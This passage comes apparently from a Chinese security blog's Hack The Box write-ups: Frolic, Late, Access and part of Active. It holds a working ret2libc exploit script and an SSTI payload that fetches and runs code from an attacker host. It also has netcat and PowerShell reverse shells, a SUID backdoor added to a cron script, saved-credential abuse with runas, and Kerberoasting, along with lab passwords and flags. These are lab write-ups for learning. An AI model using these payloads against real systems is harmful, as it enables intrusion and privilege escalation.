/lib/ld-linux.so.2 (0xb7fdb000) 得到了地址 0xb7e19000 查看一下系统位置 www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system &lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 拿到了系统地址 0003ada0 www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit &lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit 112: 0002edc0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@@GLIBC_2.10 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 450: 0002edf0 197 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@@GLIBC_2.18 558: 000b07c8 24 FUNC GLOBAL DEFAULT 13 _exit@@GLIBC_2.0 616: 00115fa0 56 FUNC GLOBAL DEFAULT 13 svc_exit@@GLIBC_2.0 652: 0002eda0 31 FUNC GLOBAL DEFAULT 13 quick_exit@@GLIBC_2.10 876: 0002ebf0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@@GLIBC_2.1.3 1046: 0011fb80 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b2204 4 OBJECT GLOBAL DEFAULT 33 argp_err_exit_status@@GLIBC_2.1 1506: 000f3870 58 FUNC GLOBAL DEFAULT 13 pthread_exit@@GLIBC_2.0 1849: 000b07c8 24 FUNC WEAK DEFAULT 13 _Exit@@GLIBC_2.1.1 2108: 001b2154 4 OBJECT GLOBAL DEFAULT 33 obstack_exit_failure@@GLIBC_2.0 2263: 0002e9f0 78 FUNC WEAK DEFAULT 13 on_exit@@GLIBC_2.0 2406: 000f4c80 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@@GLIBC_2.2 拿到了 exit 的地址 0002e9d0 www-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh &lt;/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh 15ba0b /bin/sh 拿到了 &#x2F;bin&#x2F;sh 的地址 15ba0b 然后我们写一个小脚本 import struct buf = &quot;A&quot; * 52 libc = 0xb7e19000 system = struct.pack(&#39;&lt;I&#39;, libc + 0x0003ada0) exit = struct.pack(&#39;&lt;I&#39;, libc + 0x0002e9d0) binsh = struct.pack(&#39;&lt;I&#39;, libc + 0x0015ba0b) payload = buf + system + exit + binsh print payload ┌──(root💀kali)-[~/Desktop] └─# cat exploit.py|base64 -w 0 aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= 把脚本转换为 base64 然后到靶机里再解码出来存储 print payloadwww-data@frolic:~/html/playsms$ echo -n aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d &gt; exploit.py &lt;W0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d &gt; exploit.py 输出成 exploit.py 了 ./rop $(python /var/www/html/playsms/exploit.py) 使用 rop 去执行我们的 exploit # whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=33(www-data) groups=33(www-data) 成功提权到 root 权限 cat root.txt 85d3fdf03f969892538ba9a731826222 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Late - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Late","date":"2022-04-25T11:38:36.000Z","updated":"2023-06-13T03:46:12.000Z","comments":true,"path":"2022/04/25/Hackthebox/Easy/Hackthebox-Late/","link":"","permalink":"http://www.lucifiel.com/2022/04/25/Hackthebox/Easy/Hackthebox-Late/","excerpt":"","text":"Hackthebox - Late靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.156 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-23 21:42 EDT Nmap scan report for 10.10.11.156 Host is up (0.36s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 385.69 ms 10.10.14.1 2 385.83 ms 10.10.11.156 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.86 seconds Http 这似乎是一个图像编辑器的网站，到处看看有没有什么线索 在这里找到一个链接 http://images.late.htb/ 我们去加入一个 hosts echo 10.10.11.156 late.htb images.late.htb &gt;&gt; /etc/hosts 然后再访问一下 这里似乎是上传图片，然后会扫描图片，先随便传一个试试看 我将上面这张纯黑色的图片上传上去提交以后，给了我一个文件 results.txt &lt;p&gt;&lt;/p&gt; 我不太理解是做了什么，之后去搜索了一下 https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/ 似乎意思是会把图片里的文字使用OCR识别，然后输出出来，上传一张带文字的图片试试 去上传一下 &lt;p&gt;This is the first line of this text example. This is the second line of the same text. &lt;/p&gt; 果然如此，去尝试一下上传一些恶意文件试试 &lt;p&gt;whoami &lt;/p&gt; 我上传了一张带有 whoami 的图片，识别出来后没有执行，咱们试试把 标签给闭环试试 &lt;p&gt;&lt;/p&gt;whoami&lt;p&gt; &lt;/p&gt; 闭环失败，重新构造一下其他语句 我们尝试一下 SSTI &lt;p&gt;S81 &lt;/p&gt; 得到了正确答案 漏洞利用那尝试构造一下是否可以执行命令 ${{request.application._ _globals_ _._ _builtins_ _._ _import_ _(\"os\").popen(\"whoami\").read()}} &lt;p&gt;$svc_acc &lt;/p&gt; 执行成功，这个 OCR 识别的条件非常苛刻，我尝试了很多很多字体，总算成了一个 想办法来做一个反弹 Shell 的 payload 首先我们生成我们要的图片 ${{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"curl http://10.10.14.9/payload | bash\").read()}} 接着在桌面创建一个 payload 文件，内容为 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 4444 &gt;/tmp/f 接着咱们需要开两个命令窗口 Command 1 python3 -m http.server 80 Command 2 nc -nvlp 4444 然后上传我们的 Payload ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.11.156] 58240 bash: cannot set terminal process group (1213): Inappropriate ioctl for device bash: no job control in this shell svc_acc@late:~/app$ whoami&amp;&amp;id whoami&amp;&amp;id svc_acc uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) 成功拿到一个 user 权限的 shell svc_acc@late:~$ cat user.txt cat user.txt af80a52c1f6ce51724a56a589a96ce20 成功拿到一个 user 权限的 flag 文件 权限提升首先运行一下 pspy https://github.com/DominicBreuker/pspy 这里找到了一个定时任务脚本 /usr/local/sbin/ssh-alert.sh #!/bin/bash RECIPIENT=&quot;root@late.htb&quot; SUBJECT=&quot;Email from Server Login: SSH Alert&quot; BODY=&quot; A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a` &quot; if [ ${PAM_TYPE} = &quot;open_session&quot; ]; then echo &quot;Subject:${SUBJECT} ${BODY}&quot; | /usr/sbin/sendmail ${RECIPIENT} fi 这是脚本的内容，咱们分析一下 svc_acc@late:~$ ls -la /usr/local/sbin/ssh-alert.sh -rwxr-xr-x 1 svc_acc svc_acc 433 Apr 24 07:16 /usr/local/sbin/ssh-alert.sh svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh -----a--------e--- /usr/local/sbin/ssh-alert.sh 这里查看权限，咱们是可以将内容写到进去的 echo &quot;chmod u+s /bin/bash&quot; &gt;&gt; /usr/local/sbin/ssh-alert.sh 咱们加一个 bash SUID，然后重新登录 ssh，接着执行提权命令 svc_acc@late:~$ echo &quot;chmod u+s /bin/bash&quot; &gt;&gt; /usr/local/sbin/ssh-alert.sh svc_acc@late:~$ exit logout Connection to 10.10.11.156 closed. ┌──(root💀kali)-[~/Desktop] └─# ssh svc_acc@10.10.11.156 -i id_rsa -bash-4.4$ id uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc) -bash-4.4$ bash -p bash-4.4# id uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc) 成功拿到 root 权限 bash-4.4# cat /root/root.txt 7af076bfa316a1091b3139a231ac7d1e 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Access - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Access","date":"2022-04-24T11:38:36.000Z","updated":"2023-06-13T03:39:11.000Z","comments":true,"path":"2022/04/24/Hackthebox/Easy/Hackthebox-Access/","link":"","permalink":"http://www.lucifiel.com/2022/04/24/Hackthebox/Easy/Hackthebox-Access/","excerpt":"","text":"Hackthebox - Access靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.98 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-24 22:29 EDT Nmap scan report for 10.10.10.98 Host is up (0.34s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: MegaCorp Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 338.15 ms 10.10.14.1 2 338.30 ms 10.10.10.98 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.52 seconds 这里有个 ftp，使用匿名用户查看 FTP┌──(root💀kali)-[~/Desktop] └─# ftp 10.10.10.98 Connected to 10.10.10.98. 220 Microsoft FTP Service Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. 登入后有两个文件夹 ftp&gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 09:16PM &lt;DIR&gt; Backups 08-24-18 10:00PM &lt;DIR&gt; Engineer 226 Transfer complete. Backups 和 Engineer 里分别有一个文件 ftp&gt; ls backups 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 09:16PM 5652480 backup.mdb 226 Transfer complete. ftp&gt; ls engineer 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 01:16AM 10870 Access Control.zip 226 Transfer complete. 使用 get 给它下载下来，backup.mdb 比较大，多等待一下 去查看一下 backup.mdb 的文件 漏洞利用Zip┌──(root💀kali)-[~/Desktop] └─# strings backup.mdb|grep access access4u@security 我们找到了一个密码，应该是解压密码，去尝试解压一下 ┌──(root💀kali)-[~/Desktop] └─# ls Access\\ Control.pst 2 ⨯ &#39;Access Control.pst&#39; 解压成功 PST使用 readpst 来提取文件 ┌──(root💀kali)-[~/Desktop] └─# readpst Access\\ Control.pst Opening PST file and indexes... Processing Folder &quot;Deleted Items&quot; &quot;Access Control&quot; - 2 items done, 0 items skipped. 然后查看一下 ┌──(root💀kali)-[~/Desktop] └─# cat Access\\ Control.mbox The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. 在里面找到一个密码 username = security password = 4Cc3ssC0ntr0ller 去尝试登录 23 端口 ┌──(root💀kali)-[~/Desktop] └─# telnet 10.10.10.98 Trying 10.10.10.98... Connected to 10.10.10.98. Escape character is &#39;^]&#39;. Welcome to Microsoft Telnet Service login: security password: *=============================================================== Microsoft Telnet Server. *=============================================================== C:\\Users\\security&gt;whoami access\\security 成功拿到一个 user 权限的 shell C:\\Users\\security\\Desktop&gt;type user.txt ff1f3b48913b213a31ff6756d2553d38 成功得到一个 user 权限的 flag 文件 权限提升C:\\Users\\security&gt;powershell whoami access\\security 确认 powershell 存在并可执行命令 ┌──(root💀kali)-[~/Desktop] └─# cp /opt/shells/Invoke-PowerShellTcp.ps1 nishang.ps1 我们使用 nishang 来进行提权 使用 python3 开启一个 http 服务 python3 -m http.server 80 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444 将上面这句代码添加到 nishang 最后一行，然后使用 nc 监听一个端口 nc -nvlp 4444 powershell &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.9/nishang.ps1&#39;)&quot; 然后执行 PS C:\\Users\\security&gt;whoami access\\security 现在我们得到了一个交互式 shell 了，其实这一步可以不做，不过我喜欢在 shell 内输入命令，而不能使用删除键就很难受 https://github.com/411Hall/JAWS 接着我们使用 JAWS 来进行枚举 powershell &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.9/jaws-enum.ps1&#39;)&quot; cmd.exe 764 security /q /k C:\\Windows\\system32\\login.cmd 这里看到了一个有趣的东西，我们可以去看看这是什么 C:\\Users\\security&gt;type C:\\Windows\\system32\\login.cmd @echo off rem rem Default global login script for the Telnet Server rem rem In the default setup, this command script is executed when the rem initial command shell is invoked. It, in turn, will try to invoke rem the individual user&#39;s login script. rem echo *=============================================================== echo Microsoft Telnet Server. echo *=============================================================== cd /d %HOMEDRIVE%\\%HOMEPATH% 这是脚本的内容 C:\\Users\\security&gt;cmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator 使用 cmdkey &#x2F;list 找到了存储的登录凭证 PS C:\\Users\\Public\\Desktop&gt;dir Directory: C:\\Users\\Public\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 8/22/2018 10:18 PM 1870 ZKAccess3.5 Security System.lnk 在 public 用户的桌面发现了一个快捷方式文件，查看一下 PS C:\\Users\\Public\\Desktop&gt; type &quot;ZKAccess3.5 Security System.lnk&quot; L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:? runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\\Windows\\System32\\runas.exe#..\\..\\..\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred &quot;C:\\ZKTeco\\ZKAccess3.5\\Access.exe&quot;&#39;C:\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%? ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3 O?j)?H??? )??[?_???8{E?3 O?j)?H??? )??[? ??1SPS??XF?L8C???&amp;?m?e*S-1-5-21-953262931-566350628-63446256-500 可以看到这一行 \\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred &quot;C:\\ZKTeco\\ZKAccess3.5\\Access.exe&quot; 这里的意思是 可以使用 administrator 权限运行 access.exe 文件，我们把后面的 access.exe 文件换成我们自己的命令，那不就可以提权了？ 我们把这里的 access.exe 换成我们的 nishang runas /user:ACCESS\\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.9/nishang.ps1&#39;)&quot; ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 1 ⨯ listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.98] 49166 Windows PowerShell running as user Administrator on ACCESS Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami access\\administrator 成功拿到 administrator 权限的 shell PS C:\\users\\administrator\\desktop&gt; type root.txt 6e1586cc7ab230a8d297e8f933d904cf 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Active - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Active","date":"2022-04-24T11:38:36.000Z","updated":"2023-06-13T03:39:25.000Z","comments":true,"path":"2022/04/24/Hackthebox/Easy/Hackthebox-Active/","link":"","permalink":"http://www.lucifiel.com/2022/04/24/Hackthebox/Easy/Hackthebox-Active/","excerpt":"","text":"Hackthebox - Active靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:56 EDT Nmap scan report for 10.10.10.100 Host is up (0.32s latency). Not shown: 65513 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-22 06:57:01Z) 135/tcp open msrpc? 139/tcp open netbios-ssn? 389/tcp open tcpwrapped 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msdfsr? 9389/tcp open mc-nmf .NET Message Framing 49152/tcp open unknown 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open unknown 49155/tcp open tcpwrapped 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open tcpwrapped 49165/tcp open msrpc Microsoft Windows RPC 49170/tcp open unknown 49171/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port139-TCP:V=7.91%I=7%D=4/22%Time=626251C0%P=x86_64-pc-linux-gnu%r(Get SF:Request,5,&quot;\\x83\\0\\0\\x01\\x8f&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/22%OT=53%CT=1%CU=38032%PV=Y%DS=2%DC=T%G=Y%TM=6262527 OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1 OS:05%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=O%TS=7)SEQ(SP=105%GCD=1%ISR=10E%TI=R OS:D%CI=I%II=I%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M5 OS:05NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000 OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0% OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-04-22T06:58:32 |_ start_date: 2022-04-22T06:55:19 TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 316.49 ms 10.10.14.1 2 316.60 ms 10.10.10.100 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.91 seconds Smb这里看到有 smb，去查看一下 ┌──(root💀kali)-[~/Desktop] └─# smbmap -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default shar IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server Replication READ ONLY SYSVOL NO ACCESS Logon server Users NO ACCESS 这里有一个 Replication 目录是可以查看的，去看一下 ┌──(root💀kali)-[~/Desktop] └─# smbclient //10.10.10.100/Replication Enter WORKGROUP\\root&#39;s password: Anonymous login successful Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; dir . D 0 Sat Jul 21 06:37:44 2018 .. D 0 Sat Jul 21 06:37:44 2018 active.htb D 0 Sat Jul 21 06:37:44 2018 5217023 blocks of size 4096. 249292 blocks available 有个 active.htb 文件夹，给下载下来 recurse ON prompt OFF mget * active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml 在上面这个文件中找到了一个账号和密码 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&gt;&lt;/User&gt; &lt;/Groups&gt; username = active.htb\\SVC_TGS cpassword = edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVm 漏洞利用使用 kali 自带的 gpp-decrypt 进行解密 ┌──(root💀kali)-[~/Desktop] └─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 username = SVC_TGS password = GPPstillStandingStrong2k18 现在我们有了账号密码，继续去 smb 里查看文件 smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18 smb: \\&gt; dir . DR 0 Sat Jul 21 10:39:20 2018 .. DR 0 Sat Jul 21 10:39:20 2018 Administrator D 0 Mon Jul 16 06:14:21 2018 All Users DHSrn 0 Tue Jul 14 01:06:44 2009 Default DHR 0 Tue Jul 14 02:38:21 2009 Default User DHSrn 0 Tue Jul 14 01:06:44 2009 desktop.ini AHS 174 Tue Jul 14 00:57:55 2009 Public DR 0 Tue Jul 14 00:57:55 2009 SVC_TGS D 0 Sat Jul 21 11:16:32 2018 5217023 blocks of size 4096. 279115 blocks available 似乎直接就进系统了，去找找看有没有有价值的文件 cd SVC_TGS\\Desktop\\ get user.txt ┌──(root💀kali)-[~/Desktop] └─# cat user.txt a8644850ef3290ae34457a8ad9982d5e 成功拿到 user 权限的 flag 文件 权限提升这台机器的 88 端口运行着 k8s(kerberos)，咱们可以用 impacket 来进行利用 https://github.com/SecureAuthCorp/impacket 接着把这台靶机加入到 hosts里 echo 10.10.10.100 active.htb &gt;&gt; /etc/hosts 然后使用这个工具 python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 ┌──(root💀kali)-[~/Desktop/impacket/examples] └─# python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2022-04-22 02:56:29.468554 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65399e5d81a676e87013d1d2c95a9919$831e286d069ed4766f092217ea7ed3e87d62dd0d864b137ef449c0fe02bd6d418c6ea56c01254956638d0b0e6f9868bab37574dc0bdc29f47106d8d4f96d9f87ceb62920f566339adfc5ec5d2761a97a7843be5b750a38b8f0aa42f67b3c1dd909fa1832796d43b2be9830c78450c46802a3c266a0000d0c898b003edbe894fc11e4746382b5a422e04fa23096c50d3330fa9bcae382771bcc528c090c245327d968f1bb06f345dc2d44cf92624eea731e7467f5a6dfb6c90d016bc716de3ba2128a428e7d0b4529dcad6a4d59b1780f7ef863580a1e56348eb12cb865e21c5ce047d289762b0c2ae694db3ffed75416c9cda974a3e4ca591cf25288a0278d4ff4e971013e74c5dcb2321e6b228de3617ed8f53705443dfa858d732f39df31d153ea5dfed178961933883613c692856a381c68f00a7821f77682b9d303a0c7e9af9f24cb6de1ccb5a1d74b7de0d3952669f4ea1d730a5cfabe52a970a6d38013934bea4cc175c2cdcb0da52087fb5599a769e8f50c90535c46e28a081791eb56377d67eb9b8334e89c15c25268ad9af9cea1b4d44cbd3eb5c5d431bab1aabe922fa75af954ec75b024351dd1d22a2df3d2d9f968d191fd456062f22e11c6af3d64ca9ee0bae77f933e5e1879f9f45b50e88a6de5278fffcdc20a99fde8e6e305b3bb213584d5c047df73f432